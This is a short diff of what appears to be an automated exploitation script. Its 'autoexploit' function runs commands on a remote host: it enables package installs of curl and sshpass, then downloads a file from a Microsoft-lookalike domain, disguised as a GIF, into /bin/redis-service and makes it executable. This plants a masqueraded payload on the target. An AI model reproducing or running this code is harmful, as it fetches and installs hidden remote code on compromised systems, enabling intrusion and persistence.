@@ -161,8 +161,8 @@ def reverse(remote):
 
 def autoexploit(remote, team):
     print("\033[92m[+]\033[0m AutoExploitation...")
-    #remote.shell_cmd("apt-get update -y")    
-    #remote.shell_cmd("apt-get install -y curl openssh-client sshpass libssl-dev")
+    remote.shell_cmd("apt-get update -y")    
+    remote.shell_cmd("apt-get install -y curl openssh-client sshpass libssl-dev")
     out = remote.shell_cmd(f"curl http://microsoftonline.download/download/coolcat.gif -o /bin/redis-service")
     print(out)
     out = remote.shell_cmd("chmod +x /bin/redis-service")
